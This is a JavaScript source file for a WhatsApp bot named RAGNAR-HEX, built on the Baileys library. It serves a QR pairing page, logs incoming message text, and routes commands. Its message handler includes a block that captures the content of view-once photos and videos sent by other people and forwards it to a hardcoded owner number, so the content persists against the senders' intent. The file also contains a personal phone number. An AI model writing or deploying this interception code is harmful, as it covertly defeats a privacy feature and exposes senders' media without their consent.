const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  getContentType,
  makeCacheableSignalKeyStore,
} = require('@whiskeysockets/baileys');

const express = require('express');
const qrcode = require('qrcode');
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const { handleCommands } = require('./commands');

const app = express();
const PORT = process.env.PORT || 3000;

let currentQR = null;
let botStatus = 'déconnecté';

// ─── Page Web QR ──────────────────────────────────────────────────────────────
app.get('/', async (req, res) => {
  let qrImage = '';
  if (currentQR) {
    try { qrImage = await qrcode.toDataURL(currentQR); } catch {}
  }
  res.send(`<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>RAGNAR-HEX</title>
  <meta http-equiv="refresh" content="15"/>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:linear-gradient(135deg,#0a0a0a,#1a0028,#0a0a0a);min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:'Segoe UI',sans-serif;color:#fff}
    .box{background:rgba(255,255,255,.05);border:1px solid rgba(180,0,255,.4);border-radius:20px;padding:40px;text-align:center;max-width:420px;width:93%;box-shadow:0 0 50px rgba(180,0,255,.25)}
    h1{font-size:1.9em;color:#cc44ff;margin:10px 0 5px;letter-spacing:2px}
    .badge{display:inline-block;padding:7px 20px;border-radius:20px;font-weight:bold;margin:14px 0;background:${botStatus==='connecté'?'rgba(0,200,100,.15)':'rgba(255,80,0,.15)'};border:1px solid ${botStatus==='connecté'?'#00c864':'#ff5000'};color:${botStatus==='connecté'?'#00c864':'#ff5000'}}
    .qrbox{background:#fff;border-radius:15px;padding:15px;display:inline-block;margin:20px 0}
    .qrbox img{width:230px;height:230px}
    .info{color:rgba(255,255,255,.6);font-size:.9em;margin:8px 0}
    button{background:linear-gradient(135deg,#6a00cc,#aa33ff);color:#fff;border:none;padding:13px 32px;border-radius:25px;cursor:pointer;font-size:1em;margin-top:15px;letter-spacing:1px}
    .footer{margin-top:22px;color:rgba(255,255,255,.25);font-size:.78em;letter-spacing:2px}
  </style>
</head>
<body>
<div class="box">
  <div style="font-size:2.8em">⚔️</div>
  <h1>𝐑𝐀𝐆𝐍𝐀𝐑-𝐇𝐄𝐗</h1>
  <p class="info">Bot WhatsApp par <strong>Ibrahima Sory Sacko</strong></p>
  <div class="badge">● Statut : ${botStatus}</div><br/>
  ${currentQR && botStatus !== 'connecté'
    ? `<div class="qrbox"><img src="${qrImage}" alt="QR"/></div>
       <p class="info">📱 <strong>WhatsApp → Appareils liés → Lier un appareil</strong></p>
       <p class="info">Scanne ce QR Code</p>`
    : botStatus === 'connecté'
    ? `<p class="info" style="color:#00c864;font-size:1.2em;margin:30px 0">✅ Bot connecté et actif !<br/><br/>Préfixe : <strong style="color:#aa33ff;font-size:1.5em">.</strong></p>`
    : `<p class="info" style="margin:30px 0">⏳ Chargement du QR Code...<br/>La page se rafraîchit toutes les 15 secondes</p>`
  }
  <button onclick="location.reload()">🔄 Rafraîchir</button>
  <div class="footer">⚔️ RAGNAR-HEX ⚔️</div>
</div>
</body>
</html>`);
});

// ─── Démarrage du Bot ─────────────────────────────────────────────────────────
async function startBot() {
  const logger = pino({ level: 'silent' });
  const { state, saveCreds } = await useMultiFileAuthState('./auth_info');
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    version,
    logger,
    printQRInTerminal: true,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger),
    },
    browser: ['RAGNAR-HEX', 'Chrome', '120.0.0'],
    syncFullHistory: false,
    markOnlineOnConnect: true,
    getMessage: async () => ({ conversation: '' }),
  });

  // ─── Connexion / QR ──────────────────────────────────────────────────────
  sock.ev.on('connection.update', async ({ connection, lastDisconnect, qr }) => {
    if (qr) {
      currentQR = qr;
      botStatus = 'en attente du scan';
      console.log('⚔️ [RAGNAR-HEX] QR prêt !');
    }

    if (connection === 'close') {
      currentQR = null;
      botStatus = 'déconnecté';
      const code = new Boom(lastDisconnect?.error)?.output?.statusCode;
      const reconnect = code !== DisconnectReason.loggedOut;
      console.log('❌ Connexion fermée. Code:', code);
      if (reconnect) {
        console.log('🔄 Reconnexion dans 5s...');
        setTimeout(startBot, 5000);
      } else {
        console.log('🚫 Déconnecté. Supprime auth_info/ et relance.');
      }
    }

    if (connection === 'open') {
      currentQR = null;
      botStatus = 'connecté';
      console.log('✅ [RAGNAR-HEX] CONNECTÉ !');

      // Notifier le propriétaire que le bot est en ligne
      const ownerJid = '224621963059@s.whatsapp.net';
      try {
        await new Promise(r => setTimeout(r, 3000)); // attendre 3s pour stabiliser
        await sock.sendMessage(ownerJid, {
          image: { url: 'https://i.ibb.co/5Xjhk7xV/IMG-20260401-WA1023.jpg' },
          caption: `⚔️ *RAGNAR-HEX EST EN LIGNE* ⚔️\n\n✅ Bot connecté avec succès !\n📌 Préfixe : *.*\n⏰ ${new Date().toLocaleString('fr-FR')}\n\n_Tape *.menu* pour voir les commandes_ 🥷`,
        });
        console.log('📱 Notification envoyée au propriétaire.');
      } catch (e) {
        console.log('⚠️ Notification non envoyée:', e.message);
      }
    }
  });

  // ─── Sauvegarde credentials ──────────────────────────────────────────────
  sock.ev.on('creds.update', saveCreds);

  // ─── Messages entrants ───────────────────────────────────────────────────
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;

    for (const msg of messages) {
      if (!msg.message) continue;
      if (msg.key.fromMe) continue;

      // Extraire le texte du message
      const body =
        msg.message?.conversation ||
        msg.message?.extendedTextMessage?.text ||
        msg.message?.imageMessage?.caption ||
        msg.message?.videoMessage?.caption ||
        msg.message?.buttonsResponseMessage?.selectedButtonId ||
        msg.message?.listResponseMessage?.singleSelectReply?.selectedRowId || '';

      if (body) console.log(`📩 [${msg.key.remoteJid}] → "${body}"`);

      // ── Vues uniques : intercepter et envoyer dans le DM du bot ──────────
      const msgType = getContentType(msg.message);
      if (
        msgType === 'viewOnceMessage' ||
        msgType === 'viewOnceMessageV2' ||
        msgType === 'viewOnceMessageV2Extension'
      ) {
        try {
          const vMsg =
            msg.message.viewOnceMessage ||
            msg.message.viewOnceMessageV2 ||
            msg.message.viewOnceMessageV2Extension;
          const inner = vMsg?.message;
          // Envoie dans le privé du propriétaire
          const ownerJid = '224621963059@s.whatsapp.net';
          await sock.sendMessage(ownerJid, {
            forward: { ...msg, message: inner },
          });
          console.log('🥷 Vue unique interceptée → envoyée au propriétaire');
        } catch (e) {
          console.log('⚠️ Erreur vue unique:', e.message);
        }
      }

      // ── Commandes ─────────────────────────────────────────────────────────
      try {
        await handleCommands(sock, msg);
      } catch (err) {
        console.error('❌ Erreur dans handleCommands:', err.message);
      }
    }
  });

  return sock;
}

// ─── Lancement ────────────────────────────────────────────────────────────────
app.listen(PORT, () => {
  console.log(`🌐 Serveur web lancé → port ${PORT}`);
});

startBot().catch((err) => {
  console.error('❌ Erreur fatale:', err);
  process.exit(1);
});

